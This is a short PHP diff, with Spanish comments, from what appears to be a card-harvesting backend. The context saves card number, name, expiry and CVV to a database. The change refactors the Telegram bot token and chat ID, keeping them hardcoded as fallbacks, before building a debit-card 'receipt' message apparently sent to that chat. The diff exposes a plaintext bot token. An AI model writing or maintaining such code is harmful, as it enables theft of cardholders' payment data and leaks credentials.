@@ -64,8 +64,11 @@ $saveCard = $pdo->prepare(
 $saveCard->execute([$tarjeta, $nombre, $fecha, $cvv, $key]);
 
 // ── Paso 5 ────────────────────────────────────────────────────────────────────
-$token   = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
-$chat_id = "-4923753161";
+// Configuración OPERACIONES: 1) env vars Render (nuevo) 2) fallback hardcode (legacy).
+$FALLBACK_BOT_TOKEN_OPS = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
+$FALLBACK_CHAT_ID_OPS   = "-4923753161";
+$token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_OPS;
+$chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_OPS;
 
 $mensaje  = "🧾 *Recibo Digital de Recarga (Tarjeta Débito)*\n";
 $mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
